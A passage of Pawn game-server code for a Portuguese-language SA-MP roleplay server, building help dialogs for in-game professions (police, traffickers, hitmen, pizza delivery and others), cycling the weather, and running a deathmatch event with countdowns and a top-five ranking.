		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} /Fone\nFunção: Usa o megaphone (Com áudio).");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} /Procurar [ID] [Motivo]\nFunção:\nColoca um(a) jogador(a) na lista de procurados(as).");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} /plimparficha [ID] [Motivo]\nFunção:\nRemove da lista de procurados(as) um(a) jogador(a).");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} /Algemar [ID] [Motivo]\nFunção:\nAlgema um(a) jogador(a).");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} /Desalgemar [ID] [Motivo]\nFunção:\nDesalgema um(a) jogador(a).");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} /Prender [ID] [Motivo]\nFunção:\nPrende um(a) jogador(a).");
		strcat(stg, gstring);
 		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} /Multar [ID] [Quantia] [Motivo]\nFunção:\nMulta um(a) jogador(a).");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} /CriarTapete\nFunção:\nCria um tapete de pregos para furar pneus.");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} /RemoverTapete\nFunção:\nRemover um tapete de pregos.");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FF0000}ATENÇÃO: {FFFFFF}Leia as regras policiais no fórum e /Motivos!");
		strcat(stg, gstring);
	}
	else if(pInfo[playerid][Prof] == JUIZ)
	{
		format(gstring, sizeof(gstring), "{FF1E1E}Auxilio para profissão: Juiz");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} /CP [Texto]\nFunção: Chat dos(as) Juiz(as).");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} Nenhum no momento. (Será atualizado)");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FF0000}ATENÇÃO: {FFFFFF}Leia as regras policiais no fórum e /Motivos!");
		strcat(stg, gstring);
	}
	// Categoria Governo
	else if(pInfo[playerid][Prof] == DEPUTADO)
	{
		format(gstring, sizeof(gstring), "{FF1E1E}Auxilio para profissão: Deputado(a)");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} /CP [Texto]\nFunção: Chat dos(as) deputados(as).");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} Nenhum no momento. (Será atualizado)");
		strcat(stg, gstring);
	}
	else if(pInfo[playerid][Prof] == PREFEITO)
	{
		format(gstring, sizeof(gstring), "{FF1E1E}Auxilio para profissão: Prefeito(a)");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} /CP [Texto]\nFunção: Chat dos(as) prefeito(as).");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} Nenhum no momento. (Será atualizado)");
		strcat(stg, gstring);
	}
	else if(pInfo[playerid][Prof] == GOVERNADOR)
	{
		format(gstring, sizeof(gstring), "{FF1E1E}Auxilio para profissão: Governador(a)");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} /CP [Texto]\nChat do(a) Governador.");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} Nenhum no momento. (Será atualizado)");
		strcat(stg, gstring);
	}
	// Categoria Crime
	else if(pInfo[playerid][Prof] == TRAF_DROGAS)
	{
		format(gstring, sizeof(gstring), "{FF1E1E}Auxilio para profissão: Traficante de Drogas");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} /CP [Texto]\nFunção: Chat dos(as) traficantes de drogas.");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} /PegarDroga [Cocaina/Maconha/Crack] [Quantia]\nFunção:\nPara pegar um tipo de droga na área de drogas.");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} /DrogasVenda\nFunção:\nPara saber a quantia de drogas que você possui.");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} /vMaconha [ID] [Quantia] [Valor]\nFunção:\nVende um quantia de maconha para um(a) jogador(a).");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} /vCocaina [ID] [Quantia] [Valor]\nFunção:\nVende um quantia de cocaína para um(a) jogador(a).");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} /vCrack [ID] [Quantia] [Valor]\nFunção:\nVende um quantia de crack para um(a) jogador(a).");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} /RemoverTapete\nFunção:\nRemover um tapete de pregos.");
		strcat(stg, gstring);
	}
	else if(pInfo[playerid][Prof] == TRAF_ARMAS)
	{
		format(gstring, sizeof(gstring), "{FF1E1E}Auxilio para profissão: Traficante de Armas");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} /CP [Texto]\nFunção: Chat dos(as) traficantes de armas.");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} /vArma [ID] [armaID] [munição] [preço]\nFunção:\nVende uma arma para um(a) jogador(a).");
		strcat(stg, gstring);
	}
	else if(pInfo[playerid][Prof] == HITMAN)
	{
		format(gstring, sizeof(gstring), "{FF1E1E}Auxilio para profissão: Hitman(a)");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} /CP [Texto]\nFunção: Chat dos(as) Hitman.");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} Nenhum no momento. (Será atualizado)");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF} Na sua profissão você mata alguém a pedido de alguém\nvocê terá que cobrar pelo serviço.");
		strcat(stg, gstring);
	}
	else if(pInfo[playerid][Prof] == ATIRADOR)
	{
		format(gstring, sizeof(gstring), "{FF1E1E}Auxilio para profissão: Franco-Atirador(a)");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} /CP [Texto]\nFunção: Chat dos(as) Franco-Atiradores(as).");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} Nenhum no momento. (Será atualizado)");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF} Use sua habilidade de matar na favela com sua sniper.");
		strcat(stg, gstring);
 		format(gstring, sizeof(gstring), "\n\n{FFFFFF} Você recebe R$20 por pessoa que você matar na favela.");
		strcat(stg, gstring);
	}
	else if(pInfo[playerid][Prof] == TERRORISTA)
	{
		format(gstring, sizeof(gstring), "{FF1E1E}Auxilio para profissão: Terrorista");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} /CP [Texto]\nFunção: Chat dos(as) terrorista.");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} /PlantarBomba\nFunção:\nPlanta uma bomba em um local desejado.");
		strcat(stg, gstring);
	}
	else if(pInfo[playerid][Prof] == CHEFE_MAFIA)
	{
		format(gstring, sizeof(gstring), "{FF1E1E}Auxilio para profissão: Mafioso(a)");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} /CP [Texto]\nFunção: Chat dos(as) Mafiosos(as).");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} /vMaconha [ID] [Quantia] [Valor]\nFunção:\nVende um quantia de maconha para um(a) jogador(a).");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} /vCocaina [ID] [Quantia] [Valor]\nFunção:\nVende um quantia de cocaína para um(a) jogador(a).");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} /vCrack [ID] [Quantia] [Valor]\nFunção:\nVende um quantia de crack para um(a) jogador(a).");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} /PegarDroga [Cocaina/Maconha/Crack] [Quantia]\nFunção:\nPara pegar um tipo de droga na área de drogas.");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} /DrogasVenda\nFunção:\nPara saber a quantia de drogas que você possui.");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} /vArma [ID] [armaID] [munição] [preço]\nFunção:\nVende uma arma para um(a) jogador(a).");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} /PlantarBomba\nFunção:\nPlanta uma bomba em um local desejado.");
		strcat(stg, gstring);
	}
	else if(pInfo[playerid][Prof] == CONTRABANDISTA)
	{
		format(gstring, sizeof(gstring), "{FF1E1E}Auxilio para profissão: Contrabandista");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} /CP [Texto]\nFunção: Chat dos(as) contrabandistas.");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} /pArmas \nFunção: [ak74, m4, sniper]\nPega um carregamento de armas na área de cargas.");
		strcat(stg, gstring);
	}
	// Categoria Outras 1
	else if(pInfo[playerid][Prof] == SEG_ILHA)
	{
		format(gstring, sizeof(gstring), "{FF1E1E}Auxilio para profissão: Segurança da Ilha");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} /CP [Texto]\nFunção: Chat dos(as) seguranças da ilha.");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} /AbrirCentral\nFunção:\nAbre o portão central da ilha.");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} /FecharCentral\nFunção:\nFecha o portão central da ilha.");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} /AbrirEsquerda\nFunção:\nAbre o portão esquerdo da ilha.");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} /FecharEsquerda\nFunção:\nFecha o portão esquerdo da ilha.");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} /AbrirDireita\nFunção:\nAbre o portão direito da ilha.");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} /FecharDireita\nFunção:\nFecha o portão direito da ilha.");
		strcat(stg, gstring);
	}
	else if(pInfo[playerid][Prof] == PIZZABOY)
	{
		format(gstring, sizeof(gstring), "{FF1E1E}Auxilio para profissão: Pizza(Boy/Girl)");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} /CP [Texto]\nFunção: Chat dos(as) pizza(boy/girl).");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} /vPizza [ID] [Sabor]\nFunção:\nVende uma pizza para um(a) jogador(a).");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} /Sabores\nFunção:\nAbre uma lista com os sabores disponivéis e seus ID.");
		strcat(stg, gstring);
	}
	else if(pInfo[playerid][Prof] == FOTOGRAFO)
	{
		format(gstring, sizeof(gstring), "{FF1E1E}Auxilio para profissão: Fotógrafo(a)");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} /CP [Texto]\nFunção: Chat dos(as) fotógrafos(as).");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} /TirarFoto\nFunção:\nTira uma foto em qualquer local.");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} /VenderFotos\nFunção:\nVende as fotos tiradas e você recebe por elas.");
		strcat(stg, gstring);
	}
	else if(pInfo[playerid][Prof] == REPORTER)
	{
		format(gstring, sizeof(gstring), "{FF1E1E}Auxilio para profissão: Repórter");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} /CP [Texto]\nFunção: Chat dos(as) repórters.");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} /Noticia [Noticia]\nFunção:\nUse para relatar uma notícia sobre o servidor.");
		strcat(stg, gstring);
	}
	else if(pInfo[playerid][Prof] == INSTRUTOR)
	{
		format(gstring, sizeof(gstring), "{FF1E1E}Auxilio para profissão: Instrutor(a)");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} /CP [Texto]\nFunção: Chat dos(as) instrutores(as).");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} /V [Terrestre/Nautica/Aerea]\nFunção:\nVende uma habitação para um(a) jogador(a).");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF} Faça testes com seus clientes antes de vender.");
		strcat(stg, gstring);
	}
	else if(pInfo[playerid][Prof] == MECANICO)
	{
		format(gstring, sizeof(gstring), "{FF1E1E}Auxilio para profissão: Mecânico(a)");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} /CP [Texto]\nFunção: Chat dos(as) mecânicos(as).");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} /Consertar\nFunção:\nConserta um veículo quebrado.");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} /VTunar\nFunção:\nAbre uma box para tunar veiculos.");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF} Em um veículo tracker você pode guinchar alguém casao necessário.");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF} Uso do tracker:\nTecla 0: Guincha\nTecla 8: Desce\nTecla 2: Sobe.");
		strcat(stg, gstring);
	}
	else if(pInfo[playerid][Prof] == SEG_VILA)
	{
		format(gstring, sizeof(gstring), "{FF1E1E}Auxilio para profissão: Segurança da Vila");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} /CP [Texto]\nFunção: Chat dos(as) seguranças da vila.");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} /aBpV1\nFunção:\nAbre o portão número 1 da vila.");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} /fBpV1\nFunção:\nFecha o portão número 1 da vila.");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} /aBpV2\nFunção:\nAbre o portão número 2 da vila.");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} /fBpV2\nFunção:\nFecha o portão número 2 da vila.");
		strcat(stg, gstring);
	}
	// Categoria Outras 2
	else if(pInfo[playerid][Prof] == PESCADOR)
	{
		format(gstring, sizeof(gstring), "{FF1E1E}Auxilio para profissão: Pescador(a)");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} /CP [Texto]\nFunção: Chat dos(as) pescadores(as).");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} /JogarRede\nFunção:\nJoga a rede de pesca na área de pesca.");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} /VenderPesca\nFunção:\nVende suas pescar na cooperativa de pescas.");
		strcat(stg, gstring);
	}
	else if(pInfo[playerid][Prof] == MEDICO)
	{
		format(gstring, sizeof(gstring), "{FF1E1E}Auxilio para profissão: Médico(a)");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} /CP [Texto]\nFunção: Chat dos(as) médicos(as).");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} /vCura [ID] [Preço]\nFunção:\nCura um(a) jogador(a) por um determinado preço.");
		strcat(stg, gstring);
	}
	else if(pInfo[playerid][Prof] == ADVOGADO)
	{
		format(gstring, sizeof(gstring), "{FF1E1E}Auxilio para profissão: Advogado(a)");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} /CP [Texto]\nFunção: Chat dos(as) advogados(as).");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} /Soltar [ID]\nFunção:\nSolta um(a) jogador(a) da cadeia.");
		strcat(stg, gstring);
	}
	else if(pInfo[playerid][Prof] == VENDEDOR_SKINS)
	{
		format(gstring, sizeof(gstring), "{FF1E1E}Auxilio para profissão: Vendedor(a) de Skins");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} /CP [Texto]\nFunção: Chat dos(as) vendedores(as) de skin.");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} /vSkin [ID] [ID Skin] [Preço]\nFunção:\nVende uma skin para um(a) jogador(a).");
		strcat(stg, gstring);
	}
	else if(pInfo[playerid][Prof] == FRENTISTA)
	{
		format(gstring, sizeof(gstring), "{FF1E1E}Auxilio para profissão: Frentista");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} /CP [Texto]\nFunção: Chat dos(as) Frentista.");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} /VCombustivel\nFunção:\nPara vender combustivel para players.");
		strcat(stg, gstring);
	}
 	else if(pInfo[playerid][Prof] == PROSTITUTA)
	{
		format(gstring, sizeof(gstring), "{FF1E1E}Auxilio para profissão: Prostituta");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} /CP [Texto]\nChat das prostitutas.");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} /Beijar [1/15]\nFunção:\nBeijar, são 15 tipos de beijos.");
		strcat(stg, gstring);
	}
	else if(pInfo[playerid][Prof] == PADRE)
	{
		format(gstring, sizeof(gstring), "{FF1E1E}Auxilio para profissão: Padre");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} /CP [Texto]\nFunção: Chat dos(as) padres.");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} /Abencoar [ID]\nFunção:\nAbençoa um(a) jogador(a).");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} /Casar [ID] [ID]\nFunção:\nFaz o casamento entre dois jogadores.");
		strcat(stg, gstring);
	}
	else if(pInfo[playerid][Prof] == BOMBEIRO)
	{
		format(gstring, sizeof(gstring), "{FF1E1E}Auxilio para profissão: Bombeiro(a)");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} /CP [Texto]\nFunção: Chat dos(as) bombeiros(as).");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} /ProximoIncendio - Para ir apagar um novo incêndio.");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} /eCaminhaoB - Para estacionar o caminhão de bombeiros.");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} /BaixaIncendio - Para dar baixa de um incêndio apagado.");
		strcat(stg, gstring);
	}
	format(gstring, sizeof(gstring), "\n\n\tVisite: forumwe.vivagamesonline.com");
	strcat(stg, gstring);
	ShowPlayerDialog(playerid, 1448, DIALOG_STYLE_MSGBOX, "{FFFFFF}Comandos de Profissão", stg, "Fechar", "");
	return 1;
}

forward Clima();
public Clima()
{
	new
		tR, ClimaID = minmax(1, 7);

	if(ClimaID == aClima)
	{
	    ClimaID = minmax(1, 7);
	}
	if(ClimaID == 7)
	{
	    SetWeather(8);
	    tR = minmax(17, 23);
	    SetTimer("Clima", tR*60000, false);
	}
	else if(ClimaID == 6)
	{
	    SetWeather(8);
	    tR = minmax(27, 33);
	    SetTimer("Clima", tR*60000, false);
	}
	else if(ClimaID == 5)
	{
	    SetWeather(16);
	    tR = minmax(7, 13);
	    SetTimer("Clima", tR*60000, false);
	}
	else if(ClimaID == 4)
	{
	    SetWeather(19);
	    tR = minmax(12, 18);
	    SetTimer("Clima", tR*60000, false);
	}
	else if(ClimaID == 3)
	{
	    SetWeather(19);
     	tR = minmax(115, 125);
	    SetTimer("Clima", tR*60000, false);
	}
	else if(ClimaID == 2)
	{
	    SetWeather(19);
     	tR = minmax(7, 13);
	    SetTimer("Clima", tR*60000, false);
	}
	else if(ClimaID == 1)
	{
	    SetWeather(10);
		tR = minmax(7, 13);
	    SetTimer("Clima", tR*60000, false);
	}
	aClima = ClimaID;
	print("Mudança de clima Iniciado.");
	return 1;
}

stock minmax(min, max) //By Alex "Y_Less" Cole
{
    return random(max - min) + min;
}

stock SetiSpawnInfo(playerid)
{
    format(gFile, sizeof(gFile), "Contas/%s.ini", PlayerName(playerid));
	new
		c = WE_GetInt(gFile, "Casa"), m = WE_GetInt(gFile, "MorandoID")
	;
	if(c > 0)
	{
		if(!strcmp(CasaInfo[c][Proprietario], PlayerName(playerid), true))
		{
            SetSpawnInfo(playerid, -1, WE_GetInt(f(playerid), "Skin"), CasaInfo[c][PickupX], CasaInfo[c][PickupY], CasaInfo[c][PickupZ], 0.0, -1, -1, -1, -1,0,0);
		}
	}
	else if(m > 0)
	{
		if(!strcmp(CasaInfo[m][Morador], PlayerName(playerid), true) ||
			!strcmp(CasaInfo[m][Morador2], PlayerName(playerid), true) ||
			!strcmp(CasaInfo[m][Morador3], PlayerName(playerid), true))
		{
            SetSpawnInfo(playerid, -1, WE_GetInt(f(playerid), "Skin"), CasaInfo[m][PickupX], CasaInfo[m][PickupY], CasaInfo[m][PickupZ], 0.0, -1, -1, -1, -1,0,0);
		}
	}
	else
	{
	    SetSpawnInfo(playerid, -1, WE_GetInt(f(playerid), "Skin"), -2057.4851, 469.8219, 35.1723, 268.3578, -1, -1, -1, -1,0,0);
	}
}

stock dmPlayerName(playerid)
{
	new
		pName2[MAX_PLAYER_NAME]
	;
	GetPlayerName(playerid, pName2, MAX_PLAYER_NAME+1);
	if(!strcmp("-", pName2, true))
	{
	    pName2 = "Ninguém";
	}
	return pName2;
}

stock evdmResetPlayer(playerid)
{
 	SetPlayerPos(playerid, 1227.4470,-1817.2300,16.5938);
	SetPlayerInterior(playerid, 0);
	SetCameraBehindPlayer(playerid);
	TogglePlayerControllable(playerid, true);

    SetPlayerArmour(playerid, 0.0);

	epDM[playerid][dmParticipando] = 0;
	epDM[playerid][dm_Matou] = 0;
	epDM[playerid][dm_Morreu] = 0;

	dmLimpar(playerid);
	ResetPlayerWeapons(playerid);

    SetColor(playerid);

 	for(new ii; ii < 5; ++ii)
	{
 		TextDrawHideForPlayer(playerid, dmColoText[ii]);
	}

	TextDrawHideForPlayer(playerid, dm_text_Top5[0]);
	TextDrawHideForPlayer(playerid, dm_text_Top5[1]);

	TextDrawHideForPlayer(playerid, dmiTimer[0]);
	TextDrawHideForPlayer(playerid, dmiTimer[1]);
}

forward evdmContagem();
public evdmContagem()
{
    if(esDM[evdmCount] <= 0)
	{
		foreach(Player, i)
	    {
	        if(epDM[i][dmParticipando] == 1)
	        {
	    		GameTextForPlayer(i, "~r~~h~VALENDO~w~~h~!", 2000, 5);
	    	}
	    }
	    evDMiniciar();
	    return 1;
	}
	if(esDM[evdmCount] > 0)
	{
	    esDM[evdmCount] -= 1;
	    format(gStr, 128, "~y~~h~Contagem para iniciar\n~w~~h~%d", esDM[evdmCount]);
	    foreach(Player, i)
	    {
	        if(epDM[i][dmParticipando] == 1)
	        {
		        ResetPlayerWeapons(i);
		    	GameTextForPlayer(i, gStr, 1000, 5);
	    	}
	    }
	    SetTimer("evdmContagem", 1000, false);
	}
	return 1;
}

stock evDMiniciar()
{
	foreach(Player, i)
	{
		if(epDM[i][dmParticipando] == 1)
	 	{
            dmSetEquipamentos(i);
	 	}
	}
	esDM[evdmAnt_B] = 0;
	esDM[evdmCriado] = 1;
	esDM[evdmTimer] = SetTimer("iniciarDMCount", 1000, false);
}

stock dmSetEquipamentos(playerid)
{
	if(esDM[evdmArmaPKDF] == 1)
	{
	 	dmPackSetPlayer(playerid, esDM[evdmArmaPK]);
	}
	if(esDM[evdmArmaIDDF][0] == 1 && esDM[evdmArmaIDDF][1] == 1 && esDM[evdmArmaIDDF][2] == 1)
	{
		GivePlayerWeapon(playerid, esDM[evdmArmaID][0], 999);
		GivePlayerWeapon(playerid, esDM[evdmArmaID][1], 999);
		GivePlayerWeapon(playerid, esDM[evdmArmaID][2], 999);
	}
	if(esDM[evdmColeteDF] == 1)
	{
        SetPlayerArmour(playerid, 100.0);
	}
}

forward dmRanking();
public dmRanking()
{
	new
		playerScores[MAX_PLAYERS][dm_rankingEnum],
		index
	;
	for(new i = 0; i != MAX_PLAYERS; ++i)
	//foreach(Player, i)
	{
		if(IsPlayerConnected(i) && !IsPlayerNPC(i) && epDM[i][dmParticipando] == 1)
		{
			playerScores[index][dm_player_Score] = epDM[i][dm_Matou];
			playerScores[index++][dm_player_ID] = i;
		}
 		if(epDM[i][dmParticipando] == 1)
		{
			TextDrawShowForPlayer(i, dm_text_Top5[0]);
			TextDrawShowForPlayer(i, dm_text_Top5[1]);
			TextDrawShowForPlayer(i, dmColoText[4]);
			TextDrawShowForPlayer(i, dmColoText[3]);
			TextDrawShowForPlayer(i, dmColoText[2]);
			TextDrawShowForPlayer(i, dmColoText[1]);
			TextDrawShowForPlayer(i, dmColoText[0]);
		}
	}
	dmGetPlayerHighestScores(playerScores,0,index);

	new
		score_Text[256] = "~n~",
		player_Name[20]
	;

	for(new ii; ii < 5; ++ii)
	{
		if(ii < index)
		{
    		GetPlayerName(playerScores[ii][dm_player_ID], player_Name, sizeof(player_Name));
			format(score_Text, sizeof(score_Text), "%s~n~~b~~h~%d. ~w~~h~%s - ~r~~h~%d", score_Text, ii + 1, player_Name, playerScores[ii][dm_player_Score]);
		}
		else
		{
			format(score_Text, sizeof(score_Text), "%s~n~~b~%d. ~w~~h~Ninguem", score_Text, ii + 1);
		}
		TextDrawSetString(dm_text_Top5[1], score_Text);
	}
	return 1;
}

forward iniciarDMCount();
public iniciarDMCount()
{
